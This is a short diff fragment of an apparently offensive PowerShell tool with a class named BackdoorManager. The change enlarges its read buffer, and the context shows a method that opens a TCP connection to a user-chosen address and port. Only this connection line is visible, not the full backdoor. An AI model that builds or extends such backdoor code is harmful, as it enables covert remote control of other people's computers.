@@ -119,7 +119,7 @@ class BackdoorManager {
     $textBuffer
     $sessionReader
     $textEncoding
-    [int]$readCount = 4096
+    [int]$readCount = 50*1024
 
     createBackdoorConnection() {
         $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
